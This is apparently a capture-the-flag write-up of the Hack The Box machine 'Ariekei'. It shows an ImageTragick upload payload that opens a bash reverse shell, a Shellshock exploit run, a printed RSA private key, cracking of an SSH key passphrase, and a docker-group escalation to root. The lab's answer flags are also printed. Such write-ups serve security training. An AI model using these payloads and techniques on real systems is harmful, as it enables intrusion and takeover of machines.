# Ariekei

Ariekei was an insane linux box that required getting out of 3 different docker containers and overall as a box was mainly docker features, including the priv esc. It required a bit of enumeration to find an upload site where we upload a reverse shell and get our first container. From there we move out of each one and use an exploit-db script to get a shell as www-data in beehive. We then decrypt an ssh-key with john and login to the box as user. To get root we use the docker privelages of the group to mount the root directory and privelage escalate to root.

>Skills involved in this box:
- enumeration
- lots of docker utilising
- password cracking with john
- privelage escalation with docker

# USER

>Nmap

```bash
PORT     STATE SERVICE   VERSION                                                                                   
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)                              
| ssh-hostkey:                                                                                                     
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)                                                     
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
|_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
443/tcp  open  ssl/https nginx/1.10.2
|_http-server-header: nginx/1.10.2
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
1022/tcp open  ssh       OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Our nmap reveals port 443 for https and 1022 & 22 for ssh(both ssh ports will be needed for this box).

We visit the website https://ariekei.htb and it gives us a warning for the safety of the site.
We view the SSL certificate and show the details. We find that the port has two more domains registered on it:
```bash
DNS Name: calvin.ariekei.htb
DNS Name: beehive.ariekei.htb
```
We then add theese to our hosts file and visit each of them.

Calvin - takes us to a file not found error .
beehive - takes us to the default site with the title "Undergoing maintenence".

We then use dirb to check for directories on the system;

```bash
dirb https://10.10.10.65/ -w
```
note. The -w is for ignore warnings, as we got an ssl warning when we visited the site dirb would ignore this and not carry our a proper scan so we use that parameter so it can do it properly.

We get a few files but the thing that pops out for me is the directory /cgi-bin.

We do another scan on that dir this time and we get some interesting files.

```bash
---- Scanning URL: https://10.10.10.65/cgi-bin/ ----
+ https://10.10.10.65/cgi-bin/.config (CODE:403|SIZE:1618)                                                        
+ https://10.10.10.65/cgi-bin/_vti_bin/_vti_adm/admin.dll (CODE:403|SIZE:1618)                                    
+ https://10.10.10.65/cgi-bin/_vti_bin/_vti_aut/author.dll (CODE:403|SIZE:1618)                                   
+ https://10.10.10.65/cgi-bin/_vti_bin/shtml.dll (CODE:403|SIZE:1618)                                             
+ https://10.10.10.65/cgi-bin/awstats.conf (CODE:403|SIZE:1618)                                                   
+ https://10.10.10.65/cgi-bin/development.log (CODE:403|SIZE:1618)                                                
+ https://10.10.10.65/cgi-bin/global.asa (CODE:403|SIZE:1618)                                                     
+ https://10.10.10.65/cgi-bin/global.asax (CODE:403|SIZE:1618)                                                    
+ https://10.10.10.65/cgi-bin/main.mdb (CODE:403|SIZE:1618)                                                       
+ https://10.10.10.65/cgi-bin/php.ini (CODE:403|SIZE:1618)                                                        
+ https://10.10.10.65/cgi-bin/production.log (CODE:403|SIZE:1618)                                                 
+ https://10.10.10.65/cgi-bin/readfile (CODE:403|SIZE:1618)                                                       
+ https://10.10.10.65/cgi-bin/spamlog.log (CODE:403|SIZE:1618)                                                    
+ https://10.10.10.65/cgi-bin/stats (CODE:200|SIZE:1224)                                                          
+ https://10.10.10.65/cgi-bin/thumbs.db (CODE:403|SIZE:1618)                                                      
+ https://10.10.10.65/cgi-bin/Thumbs.db (CODE:403|SIZE:1618)                                                      
+ https://10.10.10.65/cgi-bin/WS_FTP.LOG (CODE:403|SIZE:1618
```

The file /cgi-bin/stats looks interesting and we visit that and take a look at what it has to offer.

```bash
Sun Jun 14 08:33:25 UTC 2020
08:33:25 up 10 min, 0 users, load average: 0.01, 0.06, 0.05
GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. Licens>
Environment Variables:

SERVER_SIGNATURE=
Apache/2.2.22 (Debian) Server at beehive.ariekei.htb Port 80


HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
HTTP_X_FORWARDED_FOR=10.10.x.x
SERVER_PORT=80
HTTP_HOST=beehive.ariekei.htb
HTTP_X_REAL_IP=10.10.x.x
DOCUMENT_ROOT=/home/spanishdancer/content
SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
REQUEST_URI=/cgi-bin/stats
SCRIPT_NAME=/cgi-bin/stats
HTTP_CONNECTION=close
REMOTE_PORT=33762
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/usr/lib/cgi-bin
SERVER_ADMIN=webmaster@localhost
HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
REMOTE_ADDR=172.24.0.1
SHLVL=1
SERVER_NAME=beehive.ariekei.htb
SERVER_SOFTWARE=Apache/2.2.22 (Debian)
QUERY_STRING=
SERVER_ADDR=172.24.0.2
GATEWAY_INTERFACE=CGI/1.1
HTTP_UPGRADE_INSECURE_REQUESTS=1
SERVER_PROTOCOL=HTTP/1.0
HTTP_ACCEPT_ENCODING=gzip, deflate, br
REQUEST_METHOD=GET
_=/usr/bin/env
```
It seems to have all the server information for a shell script, we intincatively try a shellshocker exploit but we leave it for now and come back to it later.

We then dirb https://calvin.ariekei.htb and we get this:
```bash
---- Scanning URL: https://calvin.ariekei.htb/ ----
+ https://calvin.ariekei.htb/.config (CODE:403|SIZE:1618)                                                         
+ https://calvin.ariekei.htb/_vti_bin/_vti_adm/admin.dll (CODE:403|SIZE:1618)                                     
+ https://calvin.ariekei.htb/_vti_bin/_vti_aut/author.dll (CODE:403|SIZE:1618)                                    
+ https://calvin.ariekei.htb/_vti_bin/shtml.dll (CODE:403|SIZE:1618)                                              
+ https://calvin.ariekei.htb/awstats.conf (CODE:403|SIZE:1618)                                                    
+ https://calvin.ariekei.htb/development.log (CODE:403|SIZE:1618)                                                 
+ https://calvin.ariekei.htb/global.asa (CODE:403|SIZE:1618)                                                      
+ https://calvin.ariekei.htb/global.asax (CODE:403|SIZE:1618)                                                     
+ https://calvin.ariekei.htb/main.mdb (CODE:403|SIZE:1618)                                                        
+ https://calvin.ariekei.htb/php.ini (CODE:403|SIZE:1618)                                                         
+ https://calvin.ariekei.htb/production.log (CODE:403|SIZE:1618)                                                  
+ https://calvin.ariekei.htb/spamlog.log (CODE:403|SIZE:1618)                                                     
+ https://calvin.ariekei.htb/thumbs.db (CODE:403|SIZE:1618)                                                       
+ https://calvin.ariekei.htb/Thumbs.db (CODE:403|SIZE:1618)                                                       
+ https://calvin.ariekei.htb/upload (CODE:200|SIZE:1656)                                                          
+ https://calvin.ariekei.htb/WS_FTP.LOG (CODE:403|SIZE:1618)
```
we got to /uploads and there is a upload feature.

it appears to ask for an image to upload but we try to get around this. It looks like it could be vulnerable to an ImageTragik exploit.
After alot of reasearch we develop a file with the extension .mvg which will hold or reverse shell
exploit.mvg:
```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://"|setsid /bin/bash -i>/dev/tcp/your ip/4444 0<&1 2>&1")'ms
pop graphic-context
```

We then upload this with a listener on port 4444 and we get a shell back as root@calvin.

`cat /proc/1/group` shows that we are inside a doker container. This is worth noting for later.

We then head to enumerate files and we find something in `/common`.
```bash
[root@calvin /]# ls
ls
anaconda-post.log
app
bin
common
dev
etc
home
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
[root@calvin /]# cd common
cd common
[root@calvin common]# ls
ls
containers
network
[root@calvin common]# ls -la
ls -la
total 20
drwxr-xr-x  5 root root 4096 Sep 23  2017 .
drwxr-xr-x 36 root root 4096 Nov 13  2017 ..
drwxrwxr-x  2 root root 4096 Sep 24  2017 .secrets
drwxr-xr-x  6 root root 4096 Sep 23  2017 containers
drwxr-xr-x  2 root root 4096 Sep 24  2017 network
[root@calvin common]# cd .secrets
cd .secrets
[root@calvin .secrets]# ls
ls
bastion_key
bastion_key.pub
[root@calvin .secrets]# cat bastion_key
cat bastion_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
```

We find the private key for the user!

We give this appropriate perms with `chmod 600 id_rsa` and then we ssh into the box as erza. Another user in a docker container(you can see where this is going ahah).

`ssh -i id_rsa root@10.10.10.65 -p 1022` -  we are using ssh on port 1022 instead of 22 as it didnt work on 22.

We enumerate files and find a config file in `/common/contatiners/waf-live` it has the following contents:
```php
## Blog test vhost ##
    server {
        listen       443 ssl;
        server_name  beehive.ariekei.htb;

        location / {
                proxy_pass http://172.24.0.2/;
                proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
                proxy_redirect off;
                proxy_buffering off;
                proxy_force_ranges on;
                proxy_set_header        Host            $host;
                proxy_set_header        X-Real-IP       $remote_addr;
                proxy_set_header        X-Forwarded-For $proxy_add_x_forwarded_for;
                add_header X-Ariekei-WAF "beehive.ariekei.htb";

        }

        error_page 403 /403.html;
        location = /403.html {
            root   html;
        }

    }
```

From this we can see that the ip is 172.24.0.2.

We can also see that the beehive.ariekei.htb hostname is being forwared from blog-test contatiner.

We will now try to use shellshock again to exploit the system. We find the exploit on exploit-db(https://www.exploit-db.com/exploits/34900/).

Running the exploit gives a shell as www-data!
```bash
root@ezra:/tmp# python shellshock.py  payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/stats
[!] Successfully exploited
[!] Incoming connection from 172.24.0.1
172.24.0.1> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then navigate to the ssh directory and we find another ssh key.

We copy this to our box and try to ssh, it seems its encrypted somehow.

We use ssh2john to try and decrypt the password from it.

```bash
kali@kali:~/boxes/ariekei$ /usr/share/john/ssh2john.py id_rsa > id_rsa_hash
kali@kali:~/boxes/ariekei$ ls
exploit.py  hack.mvg  id_rsa  id_rsa_hash  nmap  notes
kali@kali:~/boxes/ariekei$ sudo john id_rsa_hash -w=/home/kali/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
purple1          (id_rsa)
1g 0:00:00:07 DONE (2020-06-14 05:11) 0.1394g/s 2000Kp/s 2000Kc/s 2000KC/sa6_123..*7¡Vamos!
Session completed
```

And we got a password! `purple1`

We then ssh as the user `spanishdancer`(the home dir of where we found the ssh key in belonged to this user)
```bash
kali@kali:~/boxes/ariekei$ ssh -i id_rsa spanishdancer@10.10.10.65
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.10.65 (10.10.10.65)' can't be established.
ECDSA key fingerprint is SHA256:00QUDuqn+W8071V5kz4hM6rnINCedq8xiLh4igg9+XM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.65' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
spanishdancer@ariekei:~$ ls
content  user.txt
spanishdancer@ariekei:~$ cat user.txt
ff0bca827a5f660f6d35df7481e5f216
```
Running `id` confirms that the user is part of a docker group, we will see if we can exploit this.
```bash
spanishdancer@ariekei:~$ id
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
spanishdancer@ariekei:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
waf-template        latest              399c8876e9ae        2 years ago         628MB
bastion-template    latest              0df894ef4624        2 years ago         251MB
web-template        latest              b2a8f8d3ef38        2 years ago         185MB
bash                latest              a66dc6cea720        2 years ago         12.8MB
convert-template    latest              e74161aded79        4 years ago         418MB
```
It shows that the user is part of the docker gorup, this is often used because they give access to users in a dedicated group to run commands as root for docker as docker needs root privelages, this makes priv esc simple as we simply use the docker image as a template to priv esc  
```bash
spanishdancer@ariekei:~$ docker run -v /:/rootexploit -i -t bash
bash-4.4# ls
bin          etc          lib          mnt          root         run          srv          tmp          var
dev          home         media        proc         rootexploit  sbin         sys          usr
bash-4.4# cd rootexploit
bash-4.4# ls
bin         dev         home        lib         lost+found  mnt         proc        run         snap        sys         usr         vmlinuz
boot        etc         initrd.img  lib64       media       opt         root        sbin        srv         tmp         var
bash-4.4# cd root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
0385b6629b30f8a673f7bb279fb1570b
bash-4.4#
```
And there we get our root shell, Thanks for reading hoep you enjoyed.



